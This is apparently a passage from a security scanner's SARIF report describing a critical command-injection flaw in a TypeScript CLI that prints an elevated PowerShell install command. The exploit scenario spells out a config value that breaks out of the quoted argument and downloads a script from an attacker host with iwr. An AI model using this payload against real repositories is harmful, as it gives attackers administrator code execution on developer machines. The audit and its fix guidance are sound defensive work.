          "ruleId": "CWE-77: Improper Neutralization of Special Elements used in a Command (Command Injection)",
          "level": "error",
          "message": {
            "text": "Unescaped config path injected into elevated PowerShell command  [CVSS 9.9: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H]"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "factory/src/cli.ts"
                },
                "region": {
                  "startLine": 116
                }
              }
            }
          ],
          "properties": {
            "severity": "critical",
            "security-severity": "9.9",
            "cvssRating": "Critical",
            "category": "CWE-77: Improper Neutralization of Special Elements used in a Command (Command Injection)",
            "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
            "cwe": "CWE-77 - Improper Neutralization of Special Elements used in a Command (Command Injection)",
            "cweId": "CWE-77",
            "cweName": "Improper Neutralization of Special Elements used in a Command (Command Injection)",
            "cvssScore": 9.9,
            "offensivePriority": "P3",
            "offensivePriorityLabel": "Internal Network / Privileged Position",
            "offensivePriorityReason": "Internal Network / Privileged Position | *exposure unverified \u2014 no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*",
            "confidence": 0.8,
            "description": "#### Description\ncommandInstall() (factory/src/cli.ts:116-119) embeds config.repoPath and the derived scriptPath directly into a single-quoted PowerShell string and tells the user to run it from an elevated prompt: console.log(`& '${scriptPath}' -RepoPath '${config.repoPath}' -ConfigPath '${process.env.FACTORY_CONFIG || \"\"}'`). repoPath flows from factory/config.json (line 3, committed to the shared repo and modifiable by any PR author) through loadConfig -> resolveConfiguredPath (config.ts:8-10), which only normalizes and does not reject quote/semicolon metacharacters (path.normalize preserves ' ; ( ) | on both Windows and POSIX). The Install branch of main() (cli.ts:142-145) calls commandInstall WITHOUT running validateConfig, so no check can stop the value. PowerShell single-quoted strings only terminate on a quote, so a single quote in repoPath ends the string and the attacker's following statements execute in the elevated session. This is an output-side injection: the program writes a command into a shell context it does not control.\n\n#### Impact\nThe 'install' command prints a PowerShell one-liner that the operator is explicitly instructed to paste into an ELEVATED prompt. config.repoPath comes from the repo-committed factory/config.json, so a PR author who can control it can break out of the single-quoted argument and run arbitrary PowerShell as administrator on the developer machine.\n\n#### Exploit scenario\nAttacker opens a PR setting factory/config.json to \"repoPath\": \"C:\\\\evil'; iwr http://attacker/t.ps1 -OutFile C:\\\\Windows\\\\Temp\\\\t.ps1 ; '\". A developer checks out the branch, runs 'node factory/dist/cli.js install', and pastes the printed line into the elevated PowerShell prompt as instructed. PowerShell parses it as: & 'C:\\\\evil' (fails harmlessly), then 'iwr http://attacker/t.ps1 -OutFile C:\\\\Windows\\\\Temp\\\\t.ps1 ;' executes as administrator, giving the attacker admin-level code execution on the host.\n\n#### Preconditions\n- Attacker can open/merge a PR that modifies repoPath in factory/config.json (low-privilege repo contributor)\n- A developer checks out that branch/commit and runs the 'factory install' command\n- The developer pastes the printed command into an elevated PowerShell prompt (the documented workflow)\n\n```\nconst scriptPath = path.join(config.repoPath, \"factory\", \"install-task.ps1\");\nconsole.log(`Run this command from an elevated PowerShell prompt to install the restartable worker:\\n\\n  & '${scriptPath}' -RepoPath '${config.repoPath}' -ConfigPath '${process.env.FACTORY_CONFIG || \"\"}'`);\n```\n\n#### How to fix\nThe emitted PowerShell must be safe to paste regardless of config content. In commandInstall (factory/src/cli.ts:117-118), either reject repoPath values containing characters outside a safe path set (quotes, semicolons, pipes, backticks, whitespace) before printing, or emit the command using PowerShell-safe quoting (double the single quotes: value.replace(/'/g, \"''\")) for scriptPath, -RepoPath, and -ConfigPath; better, have the script accept the paths via a here-string or environment variables so no operator-pasted quoting is needed.\n\n**Exploitability:** Likely CVSS 9.x-class because config-controlled repoPath is emitted into an elevated PowerShell one-liner with no escaping and no pre-validation in the Install path. The primitive is direct elevated command execution, not merely a local config issue, and the shared repo makes the source writable by PR-level actors. This is the clearest remote-to-local RCE primitive and should be ranked first.\n\n#### Adversarial verification\n**Verdict:** TRUE_POSITIVE (confidence: 9/10) \u2014 unescaped repoPath from committed, PR-modifiable config.json flows unvalidated into an elevated PowerShell command the tool instructs the developer to paste; single-quote breakout yields admin code execution; no sanitization or gate exists on the install path."
          },
